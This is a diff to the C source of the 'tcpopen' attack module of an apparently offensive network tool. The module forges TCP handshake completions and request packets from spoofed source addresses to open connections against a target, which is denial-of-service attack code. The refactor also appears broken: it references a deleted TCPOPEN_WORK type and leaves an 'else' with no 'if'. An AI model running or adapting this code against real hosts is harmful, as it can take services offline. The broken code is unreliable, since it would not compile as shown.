@@ -30,7 +30,6 @@
 #include "tea.h"
 #include "tcpopen.h"
 #include "lnet.h"
-#include "ipqex.h"
 #include "pthreadex.h"
 #include "log.h"
 #include "ip.h"
@@ -38,82 +37,89 @@
 #define BUFSIZE    2048
 
 typedef struct _tag_TCPOPEN_CFG {
-  INET_ADDR  shost;
-  INET_ADDR  dhost;
-  unsigned   npackets;
-  char      *req;
-  unsigned   req_size;
+  INET_ADDR   shost;
+  INET_ADDR   dhost;
+  unsigned    npackets;
+  char       *req;
+  unsigned    req_size;
+  LN_CONTEXT *lnc;
 } TCPOPEN_CFG;
 
-typedef struct _tag_TCPOPEN_WORK {
-  THREAD_WORK  *w;
-  LN_CONTEXT    lnc;
-  ipqex_msg_t   msg;
-  TCPOPEN_CFG   cfg;
-} TCPOPEN_WORK;
-
-static ipqex_info_t        attack_tcpopen__ipq;
 static pthreadex_flag_t    attack_flag;
+
+#define ip_protocol(x) (((struct iphdr *) (x)->s)->protocol)
+#define ip_header(x)   ((struct iphdr *)  (x)->s)
+#define tcp_header(x)  ((struct tcphdr *) ((x)->s \
+                       + (((struct iphdr *) (x)->s)->ihl << 2)))
 
 /*****************************************************************************
  * LISTENER THREAD
  *****************************************************************************/
 
-static void tcpopen__listen(TCPOPEN_WORK *tw, TEA_MSG *msg)
+static int tcpopen__listen_check(THREAD_WORK *tw, char *msg, unsigned size)
 {
-  int status;
+  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
+
+  /* check msg size and headers */
+  if(size < sizeof(struct iphdr)
+  || ip_protocol(msg) != 6
+  || size < sizeof(struct tcphdr) + (ip_header(msg)->ihl << 2))
+    return 0;
+
+  /* check msg */
+  return ip_header(msg)->daddr   == tc->shost.addr.in.addr
+      && tcp_header(msg)->source == tc->dhost.port;
+}
+
+static void tcpopen__listen(THREAD_WORK *tw)
+{
+  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
+  TEA_MSG *m;
 
   /* listen the radio */
-  while(!cfg.finalize)
+  while((m = tea_msg_get(tw)) != NULL)
   {
-    /* but ... in some circumstances ... */
-    if(ipqex_get_ip_header(&(tw->msg))->protocol == 6
-    && ipqex_get_ip_header(&(tw->msg))->daddr == tw->cfg.shost.addr.in.addr
-    && ipqex_get_tcp_header(&(tw->msg))->source == tw->cfg.dhost.port)
+    DBG("[%02u] Received a spoofed connection packet.", tw->id);
+    /*
+    DBG2("[%02u] Dropped << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
+            tw->id,
+            identify_ip_protocol(m->b),
+            (ip_header(m->b)->saddr >>  0) & 0x00ff,
+            (ip_header(m->b)->saddr >>  8) & 0x00ff,
+            (ip_header(m->b)->saddr >> 16) & 0x00ff,
+            (ip_header(m->b)->saddr >> 24) & 0x00ff,
+            tcp_header(m->b)->dest, cfg->dhost.port,
+            tcp_header(m->b)->rst,
+            ip_header(m->b)->saddr,
+            cfg->shost.s_addr);
+    */
+
+    /* in some special case (handshake) send kakitas */
+    if(tcp_header(m->b)->syn != 0
+    && tcp_header(m->b)->ack != 0)
     {
-      DBG("[LL_%02u] Received a spoofed connection packet.", tw->w->id);
-      /*
-      DBG2("[LL_%02u] Dropped << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
-              tw->w->id,
-              ipqex_identify_ip_protocol(&(tw->msg)),
-              (ipqex_get_ip_header(&(tw->msg))->saddr >>  0) & 0x00ff,
-              (ipqex_get_ip_header(&(tw->msg))->saddr >>  8) & 0x00ff,
-              (ipqex_get_ip_header(&(tw->msg))->saddr >> 16) & 0x00ff,
-              (ipqex_get_ip_header(&(tw->msg))->saddr >> 24) & 0x00ff,
-              ipqex_get_tcp_header(&(tw->msg))->dest, cfg->dhost.port,
-              ipqex_get_tcp_header(&(tw->msg))->rst,
-              ipqex_get_ip_header(&(tw->msg))->saddr,
-              cfg->shost.s_addr);
-      */
-
-      /* ignore any packet that have anything to do with this connection */
-      if(ipqex_set_verdict(&tw->msg, NF_DROP) <= 0)
-        ERR("[LL_%02u] Cannot DROP IPQ packet.", tw->w->id);
-
-      /* in some special case (handshake) send kakitas */
-      if(ipqex_get_tcp_header(&(tw->msg))->syn != 0
-      && ipqex_get_tcp_header(&(tw->msg))->ack != 0)
-      {
-        /* send handshake and data TCP packet */
-        DBG("[LL_%02u]   - Request packet sending...", tw->w->id);
-        ln_send_packet(&(tw->lnc),
-                       &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                       &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
-                       TH_ACK,
-                       ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
-                       ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
-                       ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
-                       NULL, 0);
-        ln_send_packet(&(tw->lnc),
-                       &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                       &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
-                       TH_ACK | TH_PUSH,
-                       ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
-                       ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
-                       ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
-                       (char *) tw->cfg.req, tw->cfg.req_size);
-      }
+      /* send handshake and data TCP packet */
+      DBG("[%02u]   - Request packet sending...", tw->id);
+      ln_send_packet(tc->lnc,
+                     &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
+                     &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                     TH_ACK,
+                     ntohs(tcp_header(m->b)->window),
+                     ntohl(tcp_header(m->b)->ack_seq),
+                     ntohl(tcp_header(m->b)->seq) + 1,
+                     NULL, 0);
+      ln_send_packet(tc->lnc,
+                     &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
+                     &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                     TH_ACK | TH_PUSH,
+                     ntohs(tcp_header(m->b)->window),
+                     ntohl(tcp_header(m->b)->ack_seq),
+                     ntohl(tcp_header(m->b)->seq) + 1,
+                     (char *) tc->req, tc->req_size);
     }
+
+    /* release msg buffer */
+    tea_timer_msg_release(m);
   }
 }
 
@@ -124,45 +130,46 @@ static void tcpopen__listen(TCPOPEN_WORK *tw, TEA_MSG *msg)
  *     x - sender
  *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
-static void attack_tcpopen__thread_cleanup(TCPOPEN_WORK *tw)
+static void attack_tcpopen__thread_cleanup(THREAD_WORK *tw)
 {
-  /* collect libnet data */
-  ln_destroy_context(&(tw->lnc));
+  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
 
-  /* close ipq (if this is a listener thread) */
-  if(tw->w->id < cfg->l)
+  if(tc)
   {
-    DBG("[MM_%02u] Freeing IPQ message...", tw->w->id);
-    ipqex_msg_destroy(&(tw->msg));
+    /* collect libnet data */
+    if(tc->lnc)
+    {
+      ln_destroy_context(tc->lnc);
+      tc->lnc = NULL;
+    }
+    if(tc->req)
+    {
+      free(tc->req);
+      tc->req = NULL;
+    }
+    free(tc);
+    tw->data = NULL;
   }
-
-  DBG("[MM_%02u] Finalized.", tw->w->id);
+  DBG("[%02u] Finalized.", tw->id);
 }
 
-static void attack_tcpopen__thread(THREAD_WORK *w)
+static void attack_tcpopen__thread(THREAD_WORK *tw)
 {
-  int r;
-  TCPOPEN_WORK tw;
+  TCPOPEN_WORK *tc;
 
   /* initialize specialized work thread data */
-  memset(&tw, 0, sizeof(tw));
-  tw.w = w;
-
-  /* initialize thread */
-  pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, &r);
-  pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, &r);
-  pthread_cleanup_push((void *) attack_tcpopen__thread_cleanup, &tw);
+  if((tc = calloc(1, sizeof(TCPOPEN_WORK))) == NULL)
+    D_FAT("[%02d] No memory for TCPOPEN_CFG.", tw->id);
+  tw->data = (void *) tc;
 
   /* initialize libnet */
-  DBG("[MM_%02u] Initializing libnet.", tw.w->id);
-  ln_init_context(&(tw.lnc));
-
-  /* wait 4 start */
-  pthreadex_barrier_wait(w->start);
+  DBG("[%02u] Initializing libnet.", tw->id);
+  if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
+    D_FAT("[%02d] No memory for LN_CONTEXT.", tw->id);
+  ln_init_context(tc->lnc);
 
   /* launch specialized thread */
-  if(w->id < cfg->l)
-    listener_thread(&tw);
+  listener_thread(&tw);
   else
     sender_thread(&tw);
 
